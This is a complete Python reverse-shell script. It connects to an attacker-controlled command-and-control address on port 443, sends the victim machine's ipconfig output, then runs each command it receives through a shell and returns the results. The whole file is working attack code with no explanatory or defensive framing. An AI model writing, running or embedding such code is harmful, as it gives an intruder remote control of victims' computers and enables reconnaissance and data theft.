import socket
import subprocess

CCIP = "192.168.8.107"  # Replace with attacker's IP address
CCPORT = 443            # Port to connect to

def connect(ip, port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        return client
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as e:
        client.send(f"Error executing command: {e}\n".encode())

def send_ipconfig(client):
    try:
        proc = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as e:
        client.send(f"Error running ipconfig: {e}\n".encode())

def cli(client):
    while True:
        try:
            data = client.recv(1024)
            if not data:
                break
            data = data.decode().strip()
            if data.lower() == "exit":
                break
            cmd(client, data)
        except:
            break
    client.close()

def main():
    client = connect(CCIP, CCPORT)
    if client:
        send_ipconfig(client)
        cli(client)
    else:
        print("Unable to connect to C&C server.")

if __name__ == "__main__":
    main()
